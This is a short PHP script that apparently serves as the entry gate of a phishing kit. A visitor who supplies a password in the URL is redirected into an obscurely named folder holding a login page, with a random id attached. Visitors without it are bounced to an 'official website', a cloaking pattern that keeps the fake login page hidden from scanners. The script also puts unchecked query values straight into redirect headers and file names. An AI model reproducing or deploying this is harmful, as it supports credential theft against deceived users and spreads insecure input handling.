<?php


    require_once 'app/config.php';
    if( $_GET['pwd'] == PASSWORD ) {
       // $_SESSION['lang'] = "en";
        get_lang();
        $page = "login.php";
        header("Location: dV9oBz/" . $page . "?id=" . mt_rand(11111, 99999999));
        exit();
    } else if( isset($_GET['lang']) ) {
        $page = $_SESSION['last_page'] . '.php';
        $_SESSION['lang'] = $_GET['lang'];
        header("Location: dV9oBz/" . $page . "?id=" . mt_rand(11111, 99999999));
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $page = $_GET['redirection'] . '.php';
        if( isset($_GET['error']) ) {
            header("Location: dV9oBz/" . $page . "?error=". $_GET['error'] ."&id=" . mt_rand(11111, 99999999));
            exit();
        }
        header("Location: dV9oBz/" . $page . "?id=" . mt_rand(11111, 99999999));
        exit();
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>